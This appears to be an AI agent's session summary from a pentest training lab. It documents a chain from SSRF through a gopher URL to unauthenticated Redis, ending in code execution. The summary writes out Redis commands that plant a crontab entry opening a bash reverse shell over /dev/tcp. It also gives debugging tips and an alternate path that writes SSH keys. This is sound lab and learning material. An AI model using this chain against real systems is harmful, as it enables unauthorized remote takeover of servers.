thread_id: 019065b2-3f83-73f7-b6c7-40e8e10a5d0e
updated_at: 2026-06-19T19:22:32+00:00
rollout_path: C:\Users\<USER>\.codex\sessions\2026\06\20\rollout-2026-06-20T02-45-32-019065b2-3f83-73f7-b6c7-40e8e10a5d0e.jsonl
cwd: \\?\C:\Workspace\pentest-lab

# Pivoted from a Web SSRF to internal Redis to RCE via crontab write on a training multi-service lab.

Rollout context: cwd was `C:\Workspace\pentest-lab`, lab with a web app (SSRF via URL fetch endpoint) + internal Redis at 127.0.0.1:6379 (no password).

## Task 1: SSRF (HTTP) → Gopher → Redis SET cron → cron cycle → shell

Outcome: success

Preference signals:
- Chinese narration; payloads in English.
- Wanted the full gopher URL captured in the writeup so the technique repeats.

Key steps:
- Confirmed SSRF against internal 127.0.0.1:80 (health page returned).
- Verified Redis reachable via HTTP-based fingerprint (`http://127.0.0.1:6379/` returned Redis protocol error).
- Constructed the gopher payload for Redis: `CONFIG SET dir /var/spool/cron/`, `CONFIG SET dbfilename root`, `SET x "\n\n* * * * * bash -i >& /dev/tcp/<lhost>/4444 0>&1\n\n"`, `SAVE`.
- URL-encoded the CRLF sequence properly (`%0D%0A` between each command).
- Fired the SSRF with `url=gopher://127.0.0.1:6379/_...`.
- Waited for the next cron cycle → reverse shell caught on nc listener.

Failures and how to do differently:
- First payload used LF only — Redis rejected. Used CRLF everywhere.
- Cron cycle on the target was 1-min but the first crontab write had a syntax error (missing trailing newline), skipped that cycle. Padded with `\n\n` before and after the crontab line.
- Redis's `SAVE` must be the last command — `BGSAVE` also works if `SAVE` blocks in the SSRF timeout window.

Reusable knowledge:
- Gopher protocol is the canonical SSRF-to-arbitrary-TCP pivot. Works when the SSRF library supports `gopher://` (curl, most PHP wrappers).
- Redis + crontab write requires: Redis running as root, cron installed, no ACL on `/var/spool/cron/`. Check with `id` after landing.
- Alt path if Redis is running as `redis` user: write SSH authorized_keys via `SET dir /home/redis/.ssh/` if `.ssh` writable.

References:
- [1] Payload: `gopher_redis_crontab.txt`
- [2] Test VM: multi-service training lab (web + Redis)
- [3] Reference: PayloadsAllTheThings SSRF > Gopher > Redis
